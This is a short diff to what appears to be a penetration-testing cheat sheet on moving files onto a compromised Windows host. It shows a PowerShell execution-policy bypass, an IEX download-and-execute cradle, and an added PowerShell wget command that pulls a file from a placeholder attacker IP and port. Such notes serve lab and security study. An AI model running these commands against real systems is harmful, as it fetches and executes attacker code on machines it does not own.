@@ -10,6 +10,12 @@ powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File 
 # Powershell download a file
 powershell "IEX(New Object Net.WebClient).downloadString('http://<targetip>/file.ps1')"
 
+--------------------------------------
+
+# powershell and wget
+
+powershell wget "http://<attacker ip>:<attacker port>/<file to transfer>" -outfile "<file name to save as>"
+
 -------------------------------------------
 
 FTP (pureftpd client on Kali)
